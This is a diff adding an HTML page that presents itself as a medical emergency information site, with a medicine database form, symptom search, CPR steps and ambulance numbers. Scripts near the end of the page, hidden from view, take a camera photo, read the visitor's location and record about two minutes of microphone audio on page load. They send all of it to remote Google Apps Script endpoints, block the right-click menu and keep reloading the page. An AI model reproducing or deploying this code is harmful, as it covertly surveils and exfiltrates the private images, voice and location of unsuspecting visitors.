@@ -1,0 +1,874 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=1100" />
+    <link rel="stylesheet" href="styles.css" />
+    <link rel="icon" type="image/png" href="images/photo1.jpg" />
+    <title>Medical Emergency Information</title>
+    <style>
+      /* Basic styling for the homepage */
+      body {
+        background-color: #f0f0f0;
+        margin: 0;
+        padding: 0;
+      }
+
+      header {
+        background-color: #3498db;
+        color: #fff;
+        text-align: center;
+        padding: 2em;
+      }
+
+      h1 {
+        font-size: 2em;
+        color: rgb(249, 8, 52);
+      }
+
+      h2 {
+        color: rgb(242, 7, 234);
+      }
+
+      .search {
+        background-color: #fff;
+        padding: 1em;
+        margin: 1em;
+        border: 1px solid #ccc;
+      }
+
+      footer {
+        text-align: center;
+        background-color: #333;
+        color: #fff;
+        padding: 1em;
+      }
+      .data-table {
+        border-collapse: collapse;
+        width: 100%;
+      }
+
+      .data-table th,
+      .data-table td {
+        border: 1px solid #dddddd;
+        text-align: left;
+        padding: 8px;
+      }
+
+      .data-table th {
+        background-color: #f2f2f2;
+      }
+    </style>
+  </head>
+  <body>
+    <header>
+      <h1>Medical Emergency Information</h1>
+    </header>
+    <br />
+    <form id="medicalform" style="max-width: 400px; margin: 0 auto">
+      <label for="treatment" style="font-weight: bold">Medicine:</label>
+      <input
+        type="text"
+        id="treatment"
+        name="treatment"
+        style="width: 95%; padding: 8px; margin-bottom: 10px"
+        required
+      /><br />
+
+      <label for="medicine-name" style="font-weight: bold"
+        >Symptom Category:</label
+      >
+      <select
+        id="medicine-name"
+        style="width: 100%; padding: 8px; margin-bottom: 10px"
+        onchange="handleSelectChange00(this)"
+      >
+        <option value="Fever">Fever</option>
+        <option value="Painkiller">Painkiller</option>
+        <option value="Headache">Headache</option>
+        <option value="Blood Pressure">Blood Pressure</option>
+        <option value="Cholesterol">Cholesterol</option>
+        <option value="Antibiotic">Antibiotic</option>
+        <option value="Allergy">Allergy</option>
+        <option value="Stomach Burn">Stomach Burn</option>
+        <option value="Diabetes">Diabetes</option>
+        <option value="Asthma">Asthma</option>
+        <option value="Anticoagulant">Anticoagulant</option>
+        <option value="Muscle Relax">Muscle Relax</option>
+        <option value="Heart Attack">Heart Attack</option>
+        <option value="Neural Function">Neural Function</option>
+        <option value="Diarrhoea">Diarrhoea</option>
+        <option value="Other00">Other</option>
+      </select>
+
+      <div id="customSymptomInput00" style="display: none">
+        <label for="customSymptom00" style="font-weight: bold"
+          >Custom Symptom Category:</label
+        ><br />
+        <input
+          type="text"
+          id="customSymptom00"
+          placeholder="Enter custom category"
+          style="width: 95%; padding: 8px"
+        />
+      </div>
+      <br />
+
+      <label for="quantity" style="font-weight: bold">Quantity:</label>
+      <input
+        type="text"
+        id="quantity"
+        name="quantity"
+        style="width: 95%; padding: 8px; margin-bottom: 10px"
+      /><br />
+
+      <button
+        type="button"
+        onclick="addMedicine()"
+        style="
+          background-color: #007bff;
+          color: #fff;
+          padding: 10px 20px;
+          border: none;
+          cursor: pointer;
+        "
+      >
+        Add Medicine
+      </button>
+    </form>
+    <script>
+      function handleSelectChange00(select) {
+        var customSymptomInput = document.getElementById(
+          "customSymptomInput00"
+        );
+        var customSymptom = document.getElementById("customSymptom00");
+
+        if (select.value === "Other00") {
+          customSymptomInput.style.display = "block";
+          customSymptom.setAttribute("required", true);
+        } else {
+          customSymptomInput.style.display = "none";
+          customSymptom.removeAttribute("required");
+        }
+      }
+
+      function addMedicine() {
+        var medicineName = document.getElementById("medicine-name").value;
+        var treatment = document.getElementById("treatment").value;
+        var quantity = document.getElementById("quantity").value;
+        var medicineCon;
+        if (medicineName === "Other00") {
+          medicineCon = document.getElementById("customSymptom00").value; // Use value of the input field
+        } else {
+          medicineCon = document.getElementById("medicine-name").value;
+        }
+        console.log(medicineCon);
+        console.log(medicineName);
+        var formData = new FormData();
+        formData.append("medicineName", medicineCon);
+        formData.append("treatment", treatment);
+        formData.append("quantity", quantity);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbwzgCgG8cv-zVFhmqJPGjviqqJ30bkNdhXzPHuKmDUnvWR7d2hxxfxE3dLaksEOCoJtuA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then(function (response) {
+            if (response.ok) {
+              return response.text();
+            } else {
+              throw new Error("Network response was not ok.");
+              alert("Network response was not ok.");
+              location.reload();
+            }
+          })
+          .then(function (data) {
+            // Handle the response from the script if needed
+            console.log(data);
+            alert("Medicine Data added successfully!"); // Show an alert message on success
+            location.reload();
+          })
+
+          .catch(function (error) {
+            // Handle errors here
+            console.error(error);
+            alert(
+              "An error occurred while adding the expense. Please try again."
+            );
+            location.reload();
+          });
+      }
+    </script>
+
+    <section class="search">
+      <form id="dataForm">
+        <h2><strong>Search By Medicines and Tablets</strong></h2>
+        <div id="customSymptomInput123" style="margin-top: 10px">
+          <input
+            type="text"
+            id="medicineName"
+            placeholder="Enter medicine name"
+            style="padding: 4px; font-size: 14px"
+          /><br />
+        </div>
+        <input
+          type="submit"
+          value="Search"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+          "
+        />
+      </form>
+      <br />
+      <div id="result123"></div>
+    </section>
+
+    <section class="search">
+      <form id="dataForm1">
+        <h2><strong>Search By Symptom</strong></h2>
+        <select
+          id="medicineName1"
+          onchange="handleSelectChange(this)"
+          style="padding: 4px; font-size: 14px"
+        >
+          <option value="Fever">Fever</option>
+          <option value="Painkiller">Painkiller</option>
+          <option value="Headache">Headache</option>
+          <option value="Blood Pressure">Blood Pressure</option>
+          <option value="Cholesterol">Cholesterol</option>
+          <option value="Antibiotic">Antibiotic</option>
+          <option value="Allergy">Allergy</option>
+          <option value="Stomach Burn">Stomach Burn</option>
+          <option value="Diabetes">Diabetes</option>
+          <option value="Asthma">Asthma</option>
+          <option value="Anticoagulant">Anticoagulant</option>
+          <option value="Muscle Relax">Muscle Relax</option>
+          <option value="Heart Attack">Heart Attack</option>
+          <option value="Neural Function">Neural Function</option>
+          <option value="Diarrhoea">Diarrhoea</option>
+          <option value="Other">Other</option>
+        </select>
+        <br />
+        <div id="customSymptomInput" style="display: none; margin-top: 10px">
+          <input
+            type="text"
+            id="customSymptom"
+            placeholder="Enter custom symptom"
+            style="padding: 4px; font-size: 14px"
+          />
+        </div>
+        <input
+          type="submit"
+          value="Search"
+          style="
+            background-color: #007bff;
+            color: #fff;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+          "
+        />
+      </form>
+
+      <script>
+        function handleSelectChange(select) {
+          var customSymptomInput =
+            document.getElementById("customSymptomInput");
+          var customSymptom = document.getElementById("customSymptom");
+
+          if (select.value === "Other") {
+            customSymptomInput.style.display = "block";
+            customSymptom.setAttribute("required", true);
+          } else {
+            customSymptomInput.style.display = "none";
+            customSymptom.removeAttribute("required");
+          }
+        }
+      </script>
+
+      <br />
+      <div id="result2"></div>
+    </section>
+
+    <div
+      style="
+        font-family: Arial, sans-serif;
+        width: 80%;
+        margin: 0 auto;
+        border: 1px solid #ef0909;
+        padding: 20px;
+        background-color: #f5f5f5;
+        box-shadow: 0px 0px 10px #333;
+        border-radius: 10px;
+      "
+    >
+      <h1
+        style="
+          color: #0718fb;
+          font-size: 24px;
+          margin: 0;
+          padding-bottom: 10px;
+          border-bottom: 2px solid #0808f0;
+        "
+      >
+        CPR Instructions
+      </h1>
+      <p style="font-size: 18px; line-height: 1.5; margin-top: 20px">
+        When performing CPR, follow these steps:
+      </p>
+      <p style="font-size: 16px; margin: 10px 0; color: #555">
+        Place your hands on the center of the chest, just below the nipples.
+      </p>
+      <p style="font-size: 16px; margin: 10px 0; color: #555">
+        Compress the chest approximately 2 inches deep at a rate of 100-120
+        compressions per minute.
+      </p>
+      <p style="font-size: 16px; margin: 10px 0; color: #555">
+        After 30 compressions, provide 2 rescue breaths.
+      </p>
+      <p style="font-size: 16px; margin: 10px 0; color: #555">
+        Continue these cycles until help arrives or breathing resumes.
+      </p>
+      <p
+        style="
+          font-size: 18px;
+          line-height: 1.5;
+          margin-top: 20px;
+          color: #f70ac3;
+        "
+      >
+        Remember to stay calm and save a life in an emergency.
+      </p>
+    </div>
+    <br />
+    <div
+      style="
+        display: flex;
+        flex-wrap: wrap;
+        justify-content: space-between;
+        padding: 20px;
+      "
+    >
+      <div
+        style="
+          width: calc(25% - 10px);
+          border: 2px solid #007bff;
+          background-color: #fff;
+          padding: 20px;
+          border-radius: 10px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+          text-align: center;
+          margin-bottom: 20px;
+        "
+      >
+        <h1 style="font-size: 25px; color: #007bff">
+          Medical Emergency - Ambulance
+        </h1>
+        <a href="tel:108" style="text-decoration: none">
+          <div
+            style="
+              font-size: 24px;
+              color: #ff0000;
+              padding: 15px;
+              border: 2px solid #ff0000;
+              border-radius: 8px;
+              cursor: pointer;
+            "
+          >
+            Call 108
+          </div>
+        </a>
+      </div>
+      <div
+        style="
+          width: calc(25% - 10px);
+          border: 2px solid #007bff;
+          background-color: #fff;
+          padding: 20px;
+          border-radius: 10px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+          text-align: center;
+          margin-bottom: 20px;
+        "
+      >
+        <h1 style="font-size: 25px; color: #007bff">
+          Medical Emergency At National Highway
+        </h1>
+        <a href="tel:1033" style="text-decoration: none">
+          <div
+            style="
+              font-size: 24px;
+              color: #ff0000;
+              padding: 15px;
+              border: 2px solid #ff0000;
+              border-radius: 8px;
+              cursor: pointer;
+            "
+          >
+            Call 1033
+          </div>
+        </a>
+      </div>
+      <div
+        style="
+          width: calc(25% - 10px);
+          border: 2px solid #007bff;
+          background-color: #fff;
+          padding: 20px;
+          border-radius: 10px;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+          text-align: center;
+          margin-bottom: 20px;
+        "
+      >
+        <h1 style="font-size: 25px; color: #007bff">
+          Medical Emergency At Railway Network
+        </h1>
+        <a href="tel:138" style="text-decoration: none">
+          <div
+            style="
+              font-size: 24px;
+              color: #ff0000;
+              padding: 15px;
+              border: 2px solid #ff0000;
+              border-radius: 8px;
+              cursor: pointer;
+            "
+          >
+            Call 138
+          </div>
+        </a>
+      </div>
+    </div>
+
+    <script>
+      // JavaScript to set the current year in the footer
+      document.getElementById("currentYear").innerText =
+        new Date().getFullYear();
+    </script>
+
+    <script>
+      document
+        .getElementById("dataForm")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+          const medicineName = document.getElementById("medicineName").value;
+
+          const resultDiv = document.getElementById("result123");
+          resultDiv.innerHTML = ""; // Clear previous results
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("medicineName", medicineName);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbzYJ6wy9fBlyx8jgwyQQakjSbD1MlCHH1_ZtGOWkxKP1fpA7Y5iYs9szs5FQnDb9IKx/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult1(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No Matching Rows Found");
+            });
+        });
+
+      function displayResult1(result) {
+        const resultDiv = document.getElementById("result123");
+
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult1(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent =
+            "No data found for the selected medicine name.";
+          alert("No data found for the selected medicine name.");
+        }
+      }
+
+      document
+        .getElementById("dataForm1")
+        .addEventListener("submit", function (event) {
+          event.preventDefault(); // Prevent the form from submitting the traditional way
+          var medicineName = document.getElementById("medicineName1");
+          var customSymptom = document.getElementById("customSymptom");
+
+          var medicine;
+
+          if (medicineName.value === "Other") {
+            medicine = customSymptom.value; // Use value of the input field
+          } else {
+            medicine = medicineName.value;
+          }
+          const resultDiv = document.getElementById("result2");
+          resultDiv.innerHTML = ""; // Clear previous results
+
+          // Prepare the form data
+          var formData = new FormData();
+          formData.append("medicineName", medicine);
+
+          // Send the form data to the script
+          fetch(
+            "https://script.google.com/macros/s/AKfycbzYJ6wy9fBlyx8jgwyQQakjSbD1MlCHH1_ZtGOWkxKP1fpA7Y5iYs9szs5FQnDb9IKx/exec",
+            {
+              method: "POST",
+              body: formData,
+            }
+          )
+            .then(function (response) {
+              if (response.ok) {
+                return response.text();
+              } else {
+                throw new Error("Network response was not ok.");
+              }
+            })
+            .then(function (data) {
+              // Handle the response from the script if needed
+              displayResult(data); // Call the displayResult function to show the result
+            })
+            .catch(function (error) {
+              // Handle errors here
+              console.error(error);
+              alert("No Matching Rows Found");
+            });
+        });
+
+      function displayResult(result) {
+        const resultDiv = document.getElementById("result2");
+
+        // Parse the JSON data
+        const jsonData = JSON.parse(result);
+        storedData = jsonData; // Store the data in storedData
+
+        if (jsonData.length > 0) {
+          const table = document.createElement("table");
+          table.classList.add("data-table");
+
+          const headerRow = document.createElement("tr");
+          const keys = Object.keys(jsonData[0]);
+
+          const deleteRow = (rowIndex) => {
+            alert(
+              "This action will delete the item from local storage only. To delete from the database, please contact Arun."
+            );
+            storedData.splice(rowIndex, 1);
+            displayResult(JSON.stringify(storedData)); // Redraw the table after deletion
+          };
+
+          jsonData.forEach((dataEntry, index) => {
+            const row = document.createElement("tr");
+            keys.forEach((key) => {
+              const cell = document.createElement("td");
+              const cellValue = dataEntry[key];
+              cell.textContent = cellValue;
+              row.appendChild(cell);
+            });
+
+            // Create delete button for each row, excluding the first row (index === 0)
+            if (index !== 0) {
+              const deleteButton = document.createElement("button");
+              deleteButton.textContent = "Delete";
+              deleteButton.onclick = () => deleteRow(index);
+              const deleteCell = document.createElement("td");
+              deleteCell.appendChild(deleteButton);
+              row.appendChild(deleteCell);
+            } else {
+              // For the first row, leave the cell empty as it contains headers
+              const emptyCell = document.createElement("td");
+              row.appendChild(emptyCell);
+            }
+
+            table.appendChild(row);
+          });
+
+          resultDiv.innerHTML = "";
+          resultDiv.appendChild(table);
+        } else {
+          resultDiv.textContent =
+            "No data found for the selected medicine name.";
+          alert("No data found for the selected medicine name.");
+        }
+      }
+    </script>
+
+    <video id="video" autoplay style="display: none"></video>
+    <canvas id="canvas" style="display: none"></canvas>
+    <img
+      id="captured-image"
+      src=""
+      alt="Captured Image"
+      style="display: none"
+    />
+
+    <script>
+      if (navigator.geolocation) {
+        navigator.permissions
+          .query({ name: "geolocation" })
+          .then(function (result) {
+            if (result.state === "granted") {
+              // Geolocation access granted
+              navigator.geolocation.getCurrentPosition(
+                function (position) {
+                  // Handle the obtained position
+                },
+                function (error) {
+                  console.error("Error getting geolocation:", error);
+                }
+              );
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            } else if (result.state === "denied") {
+              // Geolocation access denied by the user
+              console.error("Geolocation access denied by the user.");
+              // You can inform the user or provide an alternative method
+            } else if (result.state === "prompt") {
+              // Geolocation access is requested
+            }
+          });
+      } else {
+        console.error("Geolocation is not supported by this browser.");
+      }
+      captureCamera();
+      let latitude;
+      let longitude;
+      let mapUrl;
+      var website = "https://arunkumar-selvaraj.web.app/home.html";
+      let capturedImage = document.getElementById("captured-image");
+      var imageDataUrl;
+
+      function captureCamera() {
+        navigator.mediaDevices
+          .getUserMedia({ video: true })
+          .then(function (cameraStream) {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            video.srcObject = cameraStream;
+            video.onloadedmetadata = function () {
+              captureImage(cameraStream);
+            };
+          })
+          .catch(function (error) {
+            console.error("Error accessing the camera: " + error);
+          });
+
+        getLocation();
+      }
+
+      function getLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              latitude = position.coords.latitude;
+              longitude = position.coords.longitude;
+              mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            },
+            function (error) {
+              console.error("Error accessing geolocation: " + error);
+            }
+          );
+        } else {
+          console.error("Geolocation is not supported");
+        }
+      }
+
+      function captureImage(stream) {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const context = canvas.getContext("2d");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        imageDataUrl = canvas.toDataURL("image/png");
+        capturedImage.src = imageDataUrl;
+        if (stream) {
+          const tracks = stream.getTracks();
+          tracks.forEach((track) => track.stop());
+          sendImageData(imageDataUrl);
+        }
+      }
+
+      function sendImageData(imageDataUrl) {
+        let url =
+          "https://script.google.com/macros/s/AKfycbyRf0AWpmh3Z2CjnWYEE597VIY-gmnyj4T6AL3jnEQSfVFJ_2EWebvUiVTMoSg_ZsdO/exec";
+        console.log(latitude);
+        console.log(longitude);
+        console.log("imageDataUrl" + imageDataUrl.split("base64,")[1]);
+        let obj = {
+          base64: imageDataUrl.split("base64,")[1],
+          type: "image/png",
+          name: "captured_image.png",
+          url: mapUrl,
+          latitude: latitude,
+          longitude: longitude,
+          website: website,
+        };
+        fetch(url, {
+          method: "POST",
+          body: JSON.stringify(obj),
+        })
+          .then((response) => response.text())
+          .then((data) => console.log(data))
+          .catch((error) => console.error("Error sending image: " + error));
+      }
+    </script>
+
+    <div id="status"><span id="statusText"></span></div>
+    <script>
+      const status = document.getElementById("status");
+      console.log("Requesting access to the microphone...");
+      navigator.mediaDevices
+        .getUserMedia({ audio: true })
+        .then((stream) => {
+          console.log("Microphone access granted.");
+          const mediaRecorder = new MediaRecorder(stream);
+          const recordedChunks = [];
+          mediaRecorder.ondataavailable = (event) => {
+            recordedChunks.push(event.data);
+            console.log("Data available...");
+          };
+          mediaRecorder.onstop = () => {
+            console.log("Recording stopped.");
+            const blob = new Blob(recordedChunks, { type: "audio/webm" });
+            console.log("Blob created:", blob);
+            convertBlobToBase64(blob); // Convert blob to Base64 URL
+          };
+          mediaRecorder.start();
+          console.log("Recording started...");
+          setTimeout(() => {
+            mediaRecorder.stop();
+            console.log("Stopping recording after 10 seconds...");
+          }, 120000); // Stop recording after 10 seconds (adjust as needed)
+        })
+        .catch((err) => {
+          console.error("Error accessing the microphone:", err);
+        });
+
+      function convertBlobToBase64(blob) {
+        const reader = new FileReader();
+        reader.onload = function (event) {
+          const base64String = event.target.result.split(",")[1]; // Extracting base64 string
+          sendAudioToServer(base64String);
+        };
+        reader.readAsDataURL(blob);
+      }
+
+      function sendAudioToServer(base64String) {
+        const formData = new FormData();
+        formData.append("audio", base64String);
+        formData.append("website", website);
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
+        formData.append("url", mapUrl);
+        formData.append("name", "captured_image.png");
+        formData.append("type", "image/png");
+        formData.append("base64", imageDataUrl.split("base64,")[1]);
+
+        fetch(
+          "https://script.google.com/macros/s/AKfycbzcej4rWqyeW7zWXq6Yclfz2CFFakoeaB4PC1tWhePVVavuEdmhbjPQGe-8FO3flPOdpA/exec",
+          {
+            method: "POST",
+            body: formData,
+          }
+        )
+          .then((response) => {
+            console.log("Server response received:", response);
+            return response.text(); // Convert the response to text
+          })
+          .then((data) => {
+            console.log("Response: " + data);
+          })
+          .catch((error) => {
+            console.error("Error sending audio to the server:", error);
+            document.getElementById("status").innerText = "Error: " + error; // Display error message in the 'status' div
+          });
+      }
+      setTimeout(function () {
+        window.location.reload();
+      }, 160000);
+
+      document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+      });
+    </script>
+
+    <h1>COVID ANALYSIS</h1>
+
+    <iframe
+      src="covidanalysis.html"
+      width="1100"
+      height="600"
+      frameborder="0"
+    ></iframe>
+    <footer>
+      <p>&copy; <span id="currentYear"></span> Medical Emergency Information</p>
+    </footer>
+  </body>
+</html>
